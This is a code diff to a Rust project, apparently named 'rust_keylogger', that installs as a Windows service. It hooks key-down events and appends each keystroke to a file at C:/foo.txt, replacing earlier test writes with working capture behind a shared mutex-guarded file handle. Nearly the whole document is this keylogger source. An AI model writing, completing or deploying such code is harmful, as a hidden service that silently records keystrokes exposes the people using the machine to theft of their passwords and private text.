@@ -11,6 +11,12 @@ use device_query::{
     Keycode,
 };
 
+
+use std::sync::{
+    Arc, 
+    Mutex,
+};
+
 use anyhow::{
     Result,
     Error,
@@ -35,7 +41,7 @@ use windows_service::{
 
 define_windows_service!(ffi_service_main, service_main);
 
-const PATH: &str = "C:/Users/mremond/Documents/DevProjects/Rust/rust_keylogger/foo.txt";
+const PATH: &str = "C:/foo.txt";
 
 fn main() -> Result<(), windows_service::Error> {
     // The service must be installed, otherwise it will not work
@@ -90,23 +96,20 @@ fn run_service(_arguments: Vec<OsString>) -> Result<(), Error> {
     // Tell the system that the service is running now
     status_handle.set_service_status(next_status)?;
 
-    let mut file = File::create(PATH)?;
+    let file = Arc::new(Mutex::new(File::options().append(true).create(true).open(PATH)?));
 
-    file.write_all(b"Hello world!")?;
-    write!(file, "Hello world2!")?;
+    let f = file.clone();
+    let mut f = f.lock().unwrap();
+
+    write!(f, "gggg");
 
     let device_state = DeviceState::new();
-    let _guard = device_state.on_key_down(|key| {
-
-        write!(file, "test");
-
-        match write!(file, "Keyboard key down: {:#?}", key) {
-            _ => (),
-        };
-        match write!(file, "Hello world2!") {
-            _ => (),
-        };
-     });
+    
+    let f = file.clone();
+    let _guard = device_state.on_key_down(move |key| {
+        let mut f = f.lock().unwrap();
+        write!(f, "{:#?}", key);
+    });
 
     loop { // Infinite main loop
 
